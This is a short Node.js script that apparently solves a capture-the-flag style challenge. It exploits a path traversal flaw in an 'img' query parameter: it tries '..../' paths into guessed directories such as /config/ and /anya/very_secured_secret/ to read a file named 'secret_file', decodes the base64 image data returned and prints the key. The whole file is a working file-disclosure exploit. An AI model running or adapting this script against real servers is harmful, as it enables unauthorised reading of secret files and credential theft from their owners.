const cheerio = require("cheerio");
const axios = require("axios");
require("dotenv").config();

const requireDir = "..../";
const dirs = [
  "/db/",
  "/app/",
  "/app/sus/",
  "/config/hmm/",
  "/anya/",
  "/anya/very_secured_secret/",
  "/bin/",
  "/config/",
  "/storage/",
  "/test/",
  "/vendor/"
];

const expectedFileName = "secret_file";
const dirsGuess = dirs.map(dir => `${process.env.URL}?img=${requireDir}${dir}${expectedFileName}`);

async function scrapingKey(url) {
  const response = await axios.get(url);
  const $ = cheerio.load(response.data);
  const base64 = $("img").attr("src").split(",")[1];
  return Buffer.from(base64, "base64").toString();
}

const getSecretKey = async (directoryArray) => {
  for (let i = 0; i < dirsGuess.length; i++) {
    try {
      const key = await scrapingKey(directoryArray[i]);
      if (key.slice(0, 3) === '19b') {
        return key;
      }
    } catch (error) {
      console.error(error);
    }
  }
}

getSecretKey(dirsGuess).then((key) => {
  console.log(key);
});

